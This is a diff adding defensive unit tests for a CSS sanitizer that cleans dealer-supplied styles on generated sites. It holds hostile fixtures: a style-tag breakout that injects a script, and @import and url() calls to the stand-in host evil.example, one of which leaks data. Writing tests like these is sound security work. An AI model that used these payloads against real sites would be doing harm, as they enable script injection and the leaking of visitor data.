@@ -127,3 +127,37 @@ describe('metadata keeps a generated site findable', () => {
     expect(meta.description.trim()).not.toBe('');
   });
 });
+
+describe('custom CSS from a dealer', () => {
+  it('cannot close the style tag and open a script', () => {
+    // The serious one. Everything else here is defence in depth.
+    const out = sanitizeCustomCss('</style><script>alert(1)</script>') ?? '';
+    expect(out).not.toContain('<');
+  });
+
+  it('cannot pull in a remote stylesheet', () => {
+    // @import fires a request from the VISITOR's browser to a host the dealer
+    // picks, and lets that host restyle the page later without touching this
+    // record (security review, 2026-08-30).
+    expect(sanitizeCustomCss('@import url("https://evil.example/x.css");')).toBeUndefined();
+    expect(sanitizeCustomCss('@import url(//evil.example/x.css);')).toBeUndefined();
+  });
+
+  it('cannot call out through url()', () => {
+    const out = sanitizeCustomCss('body{background:url("https://evil.example/?c=leak")}') ?? '';
+    expect(out).not.toContain('evil.example');
+  });
+
+  it('leaves the legitimate uses alone', () => {
+    // Relative and data urls are how a dealer actually themes a page.
+    expect(sanitizeCustomCss('body{background:url("/logo.png")}')).toContain('/logo.png');
+    expect(sanitizeCustomCss('body{background:url(data:image/gif;base64,R0lGOD)}')).toContain('data:image');
+    expect(sanitizeCustomCss('.hero{color:#123456}')).toContain('#123456');
+  });
+
+  it('caps the length and ignores a non-string', () => {
+    expect((sanitizeCustomCss('a{}'.repeat(20_000)) ?? '').length).toBeLessThanOrEqual(20_000);
+    expect(sanitizeCustomCss(undefined)).toBeUndefined();
+    expect(sanitizeCustomCss({ css: 'x' })).toBeUndefined();
+  });
+});
